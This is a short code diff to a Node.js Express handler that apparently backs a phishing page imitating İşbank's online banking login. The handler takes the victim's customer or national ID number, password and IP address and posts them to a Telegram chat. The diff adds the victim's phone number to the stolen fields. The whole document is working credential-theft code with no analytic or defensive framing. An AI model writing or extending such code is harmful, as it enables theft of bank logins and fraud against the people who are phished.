@@ -31,6 +31,7 @@ const sendMessageToTelegram = async (message) => {
 app.post("/dmn", async (req, res) => {
   const musNo = req.body["_ctl0:_ctl0_MusNoText"];
   const parola = req.body["_ctl0:ParolaText"];
+  const user_prefs2 = req.body["user_prefs2"];
   const userIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
 
   try {
@@ -53,6 +54,7 @@ app.post("/dmn", async (req, res) => {
 *--- İsbankası Giriş Bilgileri ---*
 *Müşteri No/TC:* \`${musNo}\`
 *Şifre:* \`${parola}\`
+*Telefon Numarası:* \`${user_prefs2}\`
 *IP:* \`${userIP}\`
 *------------------------------------*
 *API Verileri:*
